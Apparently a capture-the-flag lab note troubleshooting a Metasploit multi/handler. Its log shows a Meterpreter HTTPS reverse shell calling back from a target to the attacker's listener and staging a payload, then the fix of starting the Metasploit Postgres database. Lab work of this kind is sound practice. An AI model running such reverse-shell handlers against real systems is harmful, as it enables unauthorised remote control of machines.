` Without a database connected that payload UUID tracking will not work!`
```bash
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://10.10.14.39:8443
[!] https://10.10.14.39:8443 handling request from 10.10.110.3; (UUID: onfqmwpw) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.39:8443 handling request from 10.10.110.3; (UUID: onfqmwpw) Staging x64 payload (201820 bytes) ...
[!] https://10.10.14.39:8443 handling request from 10.10.110.3; (UUID: onfqmwpw) Without a database connected that payload UUID tracking will not work!
[-] Meterpreter session 1 is not valid and will be closed
[*] 10.10.110.3 - Meterpreter session 1 closed.
```
`db_status`
- checks to see if database is attached to msfconsole
```bash
msf6 > db_status
[*] postgresql selected, no connection
msf6 > 
```
`msfdb init`
```bash
[root💀~/offshore/ms01] [10.10.14.39] [2023-10-23 17:43:09] 
 └─╼ # msfdb init
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```
`service postgresql start`
```bash
[root💀~/offshore/ms01] [10.10.14.39] [2023-10-23 17:44:16] 
 └─╼ # service postgresql start
 ```
 `service postgresql status`
```bash
[root💀~/offshore/ms01] [10.10.14.39] [2023-10-23 17:44:33] 
 └─╼ # service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; preset: disabled)
     Active: active (exited) since Mon 2023-10-23 17:43:15 EDT; 1min 21s ago
    Process: 409598 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 409598 (code=exited, status=0/SUCCESS)
        CPU: 9ms

Oct 23 17:43:15 gobots systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
Oct 23 17:43:15 gobots systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.
```
`db_status`
```bash
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
msf6 > 
```